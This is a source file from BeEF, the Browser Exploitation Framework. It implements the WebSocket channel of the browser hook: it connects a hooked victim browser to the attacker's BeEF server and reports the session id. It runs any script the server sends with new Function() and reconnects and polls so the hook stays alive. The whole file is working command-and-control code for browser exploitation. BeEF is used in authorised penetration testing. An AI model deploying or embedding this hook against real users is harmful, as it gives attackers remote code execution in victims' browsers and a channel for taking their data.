//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


/**
 * @Literal object: beef.websocket
 *
 * Manage the WebSocket communication channel.
 * This channel is much faster and responsive, and it's used automatically
 * if the browser supports WebSockets AND beef.http.websocket.enable = true.
 */

beef.websocket = {

    socket:null,
    ws_poll_timeout: "<%= @ws_poll_timeout %>",

    /**
     * Initialize the WebSocket client object.
     * Note: use WebSocketSecure only if the hooked domain is under https.
     * Mixed-content in WS is quite different from a non-WS context.
     */
    init:function () {
        var webSocketServer = beef.net.host;
        var webSocketPort = "<%= @websocket_port %>";
        var webSocketSecure = "<%= @websocket_secure %>";
        var protocol = "ws://";

        if(webSocketSecure && window.location.protocol=="https:"){
            protocol = "wss://";
            webSocketPort= "<%= @websocket_sec_port %>";
        }

        if (beef.browser.isFF() && !!window.MozWebSocket) {
            beef.websocket.socket = new MozWebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
        }else{
            beef.websocket.socket = new WebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
        }

    },

    /**
     * Send Helo message to the BeEF server and start async polling.
     */
    start:function () {
        new beef.websocket.init();
        this.socket.onopen = function () {
            beef.websocket.send('{"cookie":"' + beef.session.get_hook_session_id() + '"}');
            beef.websocket.alive();
        };

        this.socket.onmessage = function (message) {
            // Data coming from the WebSocket channel is either of String, Blob or ArrayBufferdata type.
            // That's why it needs to be evaluated first. Using Function is a bit better than pure eval().
            // It's not a big deal anyway, because the eval'ed data comes from BeEF itself, so it is implicitly trusted.
            new Function(message.data)();
        };

        this.socket.onclose = function () {
            setTimeout(function(){beef.websocket.start()}, 5000);
        };
    },

    /**
     * Send data back to BeEF. This is basically the same as beef.net.send,
     * but doesn't queue commands.
     * Example usage:
     * beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid +
     * '", "result":"' + beef.encode.base64.encode(beef.encode.json.stringify(results)) +
     * '","callback": "' + callback + '","bh":"' + beef.session.get_hook_session_id() + '" }');
     */
    send:function (data) {
        try {
            this.socket.send(data);
        }catch(err){}
    },

    /**
     * Polling mechanism, to notify the BeEF server that the browser is still hooked,
     * and the WebSocket channel still alive.
     * todo: there is probably a more efficient way to do this. Double-check WebSocket API.
     */
    alive: function (){
        beef.websocket.send('{"alive":"'+beef.session.get_hook_session_id()+'"}');
        setTimeout("beef.websocket.alive()", beef.websocket.ws_poll_timeout);
    }
};

beef.regCmp('beef.websocket');